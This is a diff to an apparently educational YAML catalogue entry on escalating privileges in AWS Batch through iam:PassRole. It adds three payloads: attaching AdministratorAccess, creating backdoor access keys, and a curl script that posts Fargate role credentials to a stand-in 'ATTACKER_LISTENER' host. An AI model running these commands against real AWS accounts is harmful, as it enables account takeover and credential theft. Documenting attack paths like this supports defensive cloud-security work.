@@ -33,7 +33,7 @@ prerequisites:
     - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
     - An existing Batch job queue and compute environment must be available in the account
   lateral:
-    - A role must exist that trusts the Batch service and has elevated permissions
+    - A role must exist that trusts batch.amazonaws.com to assume it (or can be assumed via the Batch Fargate execution chain)
     - An existing Batch job queue and compute environment must be available in the account
 
 exploitationSteps:
@@ -139,15 +139,15 @@ attackVisualization:
     - id: start
       label: Starting Principal
       type: principal
-      description: The principal with `iam:PassRole`, `batch:RegisterJobDefinition`, and `batch:SubmitJob` permissions. Can be an IAM user or role. The attacker registers a new Batch job definition that passes an admin IAM role as the jobRoleArn, then submits a job that executes arbitrary commands using that role's credentials.
+      description: The principal with `iam:PassRole`, `batch:RegisterJobDefinition`, and `batch:SubmitJob` permissions. Can be an IAM user or role. The attacker registers a new Batch job definition that passes a target IAM role as the `jobRoleArn`, then submits a job that executes a chosen payload using that role's credentials.
 
     - id: job_definition
       label: New Batch Job Definition
       type: resource
       description: |
-        A new AWS Batch job definition registered by the attacker. The key element is the `jobRoleArn` field, which is set to the target admin IAM role. Any container launched from this definition automatically assumes that role. The attacker also controls the container command, which is set to call `iam:AttachUserPolicy` to attach AdministratorAccess to the starting user.
+        A new AWS Batch job definition registered by the attacker. The key element is the `jobRoleArn` field, which is set to the target IAM role. Any container launched from this definition automatically assumes that role. The attacker controls both the container image and the command, allowing multiple payload options depending on the runtime.
 
-        The job definition is registered with:
+        Example registration (attach-policy payload):
         ```bash
         aws batch register-job-definition \
           --job-definition-name privesc-job-def \
@@ -157,6 +157,8 @@ attackVisualization:
             "image": "amazon/aws-cli:latest",
             "jobRoleArn": "arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE",
             "executionRoleArn": "arn:aws:iam::ACCOUNT_ID:role/EXECUTION_ROLE",
+            "resourceRequirements": [{"type": "VCPU", "value": "0.25"}, {"type": "MEMORY", "value": "512"}],
+            "networkConfiguration": {"assignPublicIp": "ENABLED"},
             "command": ["iam", "attach-user-policy", "--user-name", "STARTING_USER", "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"]
           }'
         ```
@@ -164,38 +166,100 @@ attackVisualization:
     - id: batch_container
       label: Fargate Container
       type: resource
-      description: The AWS Batch Fargate container launched when the job is submitted. The container runs using the `jobRoleArn` from the job definition, meaning its process environment has temporary credentials for the admin IAM role. The container executes the command embedded in the job definition — in this case, the AWS CLI command to attach AdministratorAccess to the starting user.
+      description: The AWS Batch Fargate container launched when the job is submitted. The container runs using the `jobRoleArn` from the job definition, meaning its process environment has temporary credentials for the target IAM role. The container executes the command embedded in the job definition using those credentials. The attacker's choice of payload determines what the container does with those credentials.
 
     - id: admin_role
-      label: Admin Role
+      label: Target Role (jobRoleArn)
       type: principal
-      description: The IAM role specified as the `jobRoleArn` in the job definition. This role must trust the Batch service (`batch.amazonaws.com`) so that Fargate containers can assume it. The role's temporary credentials are injected into the container environment automatically. The outcome of the attack depends entirely on the permissions this role has.
+      description: The IAM role specified as the `jobRoleArn` in the job definition. This role must trust the Batch service (`batch.amazonaws.com`) so that Fargate containers can assume it. The role's temporary credentials are injected into the container environment via the ECS task credential endpoint. The outcome of the attack depends entirely on the permissions this role has.
+
+    - id: payload_attach_policy
+      label: "Payload A: Attach Admin Policy"
+      type: payload
+      color: '#99ccff'
+      description: |
+        Bake an `aws iam attach-user-policy` command into the job definition's container command. Uses the `amazon/aws-cli:latest` image — no custom image required. The container runs with the target role's credentials and calls `iam:AttachUserPolicy` to grant AdministratorAccess to the starting user.
+
+        Job definition command:
+        ```bash
+        ["iam", "attach-user-policy",
+         "--user-name", "STARTING_USER",
+         "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"]
+        ```
+
+        The target role must have `iam:AttachUserPolicy` permission for this to succeed. This is the most direct path — the starting user gains admin immediately when the job completes.
+
+    - id: payload_create_access_key
+      label: "Payload B: Create Backdoor Access Keys"
+      type: payload
+      color: '#99ccff'
+      description: |
+        Bake an `aws iam create-access-key` command into the job definition's container command. Uses the `amazon/aws-cli:latest` image. The container calls `iam:CreateAccessKey` for the starting user and prints the new AccessKeyId and SecretAccessKey to stdout. The credentials appear in the CloudWatch Logs stream for the Batch job.
+
+        Job definition command:
+        ```bash
+        ["iam", "create-access-key", "--user-name", "STARTING_USER"]
+        ```
+
+        Retrieve the new credentials after the job completes:
+        ```bash
+        aws logs get-log-events \
+          --log-group-name /aws/batch/job \
+          --log-stream-name privesc-job-def/default/JOB_ID
+        ```
+
+        The target role must have `iam:CreateAccessKey` permission. This provides credential-based persistence — the new keys are a second, independent set of credentials for the starting user.
+
+    - id: payload_exfil_https
+      label: "Payload C: Exfiltrate Credentials via HTTPS"
+      type: payload
+      color: '#99ccff'
+      description: |
+        Use a generic runtime image (e.g. `ubuntu:latest`) that has `sh` plus at least one of: `curl`, `wget`, or `python3`. The job definition command is a multi-line shell script that fetches the Fargate task's temporary credentials from the ECS task credential endpoint and POSTs them to an attacker-controlled HTTPS listener.
+
+        The credentials are available at `AWS_CONTAINER_CREDENTIALS_FULL_URI` (for Fargate) or at `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`:
+        ```bash
+        #!/bin/sh
+        CREDS=$(curl -s "$AWS_CONTAINER_CREDENTIALS_FULL_URI")
+        curl -s -X POST https://ATTACKER_LISTENER \
+          -H "Content-Type: application/json" \
+          -d "$CREDS"
+        ```
+
+        This produces the target role's AccessKeyId, SecretAccessKey, and SessionToken, which the attacker can configure locally:
+        ```bash
+        aws configure set aws_access_key_id AKID
+        aws configure set aws_secret_access_key SECRET
+        aws configure set aws_session_token TOKEN
+        ```
+
+        No IAM write permissions on the target role are required — only the ability to make an outbound HTTPS request from the container.
 
     - id: admin
       label: Effective Administrator
       type: outcome
-      description: The admin role has AdministratorAccess or equivalent permissions (including `iam:AttachUserPolicy`). The container command successfully attaches AdministratorAccess to the starting user, granting full administrative access to the AWS account.
+      description: The target role has AdministratorAccess or equivalent permissions. Using any of the three payloads, the attacker successfully leverages these permissions to gain full administrative access to the AWS account.
 
     - id: some_perms
       label: Elevated Access
       type: outcome
       color: '#ffeb99'
-      description: The role has some elevated permissions but not full admin access. The container can leverage those permissions for data exfiltration, accessing sensitive resources, or exploring additional privilege escalation paths, but cannot directly modify IAM to elevate the starting principal.
+      description: The target role has some elevated permissions but not full admin access. The chosen payload can leverage those permissions for data exfiltration (S3, RDS, DynamoDB), accessing sensitive resources, or exploring additional privilege escalation paths.
 
     - id: no_perms
       label: Minimal Access
       type: outcome
       color: '#cccccc'
-      description: The role only has minimal permissions (e.g., logging). The container command fails or has no meaningful impact. No privilege escalation is achieved through this path, though the job definition can be modified to attempt different actions.
+      description: The target role only has minimal permissions (e.g., `logs:PutLogEvents`). Regardless of the payload used, the privilege escalation provides limited value. The container command may fail or have no meaningful impact.
 
   edges:
     - from: start
       to: job_definition
       label: iam:PassRole + batch:RegisterJobDefinition
       description: |
-        Register a new Batch job definition that passes the target admin role as the `jobRoleArn`. The `iam:PassRole` permission is required to assign the role to the job definition. The container command is set to attach AdministratorAccess to the starting user.
+        Register a new Batch job definition that passes the target role as the `jobRoleArn`. The `iam:PassRole` permission is required to assign the role to the job definition. The container image and command are chosen based on the intended payload.
 
-        Command:
+        Example command (Payload A — attach-policy):
         ```bash
         aws batch register-job-definition \
           --job-definition-name privesc-job-def \
@@ -228,25 +292,82 @@ attackVisualization:
     - from: batch_container
       to: admin_role
       label: Container assumes jobRoleArn
-      description: The Fargate container automatically assumes the IAM role specified as the `jobRoleArn` in the job definition. Temporary credentials for the admin role are injected into the container's environment. The container then executes its command using those credentials.
+      description: The Fargate container automatically assumes the IAM role specified as the `jobRoleArn` in the job definition. Temporary credentials are injected into the container environment via the ECS task credential endpoint (`AWS_CONTAINER_CREDENTIALS_FULL_URI`). The container then executes its payload using those credentials.
 
     - from: admin_role
+      to: payload_attach_policy
+      label: Option A
+      description: Use the aws-cli runtime (`amazon/aws-cli:latest`) and bake an `iam attach-user-policy` command into the job definition. The most direct path — grants AdministratorAccess to the starting user immediately upon job completion.
+
+    - from: admin_role
+      to: payload_create_access_key
+      label: Option B
+      description: Use the aws-cli runtime (`amazon/aws-cli:latest`) and bake an `iam create-access-key` command into the job definition. Creates a second set of programmatic credentials for the starting user; retrieve them from CloudWatch Logs after the job completes.
+
+    - from: admin_role
+      to: payload_exfil_https
+      label: Option C
+      description: Use a generic runtime image (e.g. `ubuntu:latest`) and bake a shell script that fetches the task's temporary credentials from the ECS credential endpoint and POSTs them to an attacker-controlled HTTPS listener. No IAM write permissions needed on the target role.
+
+    - from: payload_attach_policy
       to: admin
-      label: If role has admin permissions
-      branch: A
+      label: If target role has admin or iam:AttachUserPolicy
+      branch: A1
       condition: admin
-      description: If the admin role has AdministratorAccess or includes `iam:AttachUserPolicy`, the container command successfully attaches AdministratorAccess to the starting user. The attacker now has full administrative access to the AWS account.
+      description: The target role has `iam:AttachUserPolicy` (or AdministratorAccess). The container command successfully attaches AdministratorAccess to the starting user, granting full administrative access to the AWS account.
 
-    - from: admin_role
+    - from: payload_attach_policy
       to: some_perms
-      label: If role has some elevated permissions
-      branch: B
+      label: If target role has elevated but non-IAM permissions
+      branch: A2
       condition: some_permissions
-      description: If the role has elevated but non-admin permissions, the container can use those permissions for data access, lateral movement, or further escalation attempts. However, the direct IAM escalation command will fail if `iam:AttachUserPolicy` is not included.
+      description: The target role has elevated permissions but not `iam:AttachUserPolicy`. The attach-policy command fails, but the role's other permissions (S3, RDS, etc.) can still be leveraged for data access or further escalation via a different payload.
 
-    - from: admin_role
+    - from: payload_attach_policy
       to: no_perms
-      label: If role has minimal permissions
-      branch: C
+      label: If target role has minimal permissions
+      branch: A3
       condition: no_permissions
-      description: If the role only has minimal permissions, the container command will fail and no meaningful privilege escalation is achieved. The attack provides no additional access beyond what the starting principal already had.
+      description: The target role has only minimal permissions. The attach-policy command fails and no meaningful privilege escalation is achieved.
+
+    - from: payload_create_access_key
+      to: admin
+      label: If target role has iam:CreateAccessKey
+      branch: B1
+      condition: admin
+      description: The target role has `iam:CreateAccessKey` and the starting user has admin-equivalent permissions. The container creates a new access key for the starting user; the new credentials appear in CloudWatch Logs. The attacker retrieves them and gains a second path to full administrative access.
+
+    - from: payload_create_access_key
+      to: some_perms
+      label: If target role has iam:CreateAccessKey, user has some permissions
+      branch: B2
+      condition: some_permissions
+      description: The target role has `iam:CreateAccessKey`. The container creates new credentials for the starting user. The resulting access is bounded by the starting user's existing permissions, which are elevated but not admin.
+
+    - from: payload_create_access_key
+      to: no_perms
+      label: If target role lacks iam:CreateAccessKey
+      branch: B3
+      condition: no_permissions
+      description: The target role does not have `iam:CreateAccessKey`. The command fails and no new credentials are created. No meaningful privilege escalation is achieved.
+
+    - from: payload_exfil_https
+      to: admin
+      label: If target role has admin permissions
+      branch: C1
+      condition: admin
+      description: The target role has AdministratorAccess or equivalent. The exfiltrated temporary credentials (AccessKeyId, SecretAccessKey, SessionToken) provide full administrative access when configured locally. No IAM write permissions were required for the exfiltration step.
+
+    - from: payload_exfil_https
+      to: some_perms
+      label: If target role has elevated permissions
+      branch: C2
+      condition: some_permissions
+      description: The target role has elevated but non-admin permissions. The exfiltrated credentials can be used for data access (S3, RDS, DynamoDB), lateral movement, or further privilege escalation attempts from the attacker's local environment.
+
+    - from: payload_exfil_https
+      to: no_perms
+      label: If target role has minimal permissions
+      branch: C3
+      condition: no_permissions
+      description: The target role only has minimal permissions. The exfiltrated credentials provide limited value for further attacks regardless of what the attacker attempts locally.
